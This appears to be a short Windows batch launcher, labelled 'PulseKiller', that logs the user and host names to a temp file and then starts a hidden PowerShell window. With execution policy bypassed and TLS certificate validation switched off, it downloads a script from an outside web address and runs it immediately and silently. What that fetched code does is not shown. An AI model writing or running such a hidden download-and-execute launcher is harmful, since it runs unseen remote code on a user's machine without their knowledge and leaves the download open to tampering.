@echo off
setlocal
set "DBG=%TEMP%\PulseKiller-debug.log"
>"%DBG%" echo [start] %DATE% %TIME% user=%USERNAME% host=%COMPUTERNAME%
start "" /min powershell -NoProfile -ExecutionPolicy Bypass -WindowStyle Hidden -Command "$ErrorActionPreference='Stop'; $d='%DBG%'; try { [Net.ServicePointManager]::SecurityProtocol=[Net.SecurityProtocolType]'Tls12,Tls11,Tls'; [Net.ServicePointManager]::ServerCertificateValidationCallback={$true}; Add-Content -LiteralPath $d ('[ps] '+$PSVersionTable.PSVersion); $sb=irm 'https://script.nep.red'; Add-Content -LiteralPath $d ('[dl] ok len='+$sb.Length); & ([scriptblock]::Create($sb)) -Headless -NoElevate -Harden *>$null; Add-Content -LiteralPath $d '[done] ok' } catch { Add-Content -LiteralPath $d ('[err] '+$_.Exception.Message) }"
endlocal
exit /b
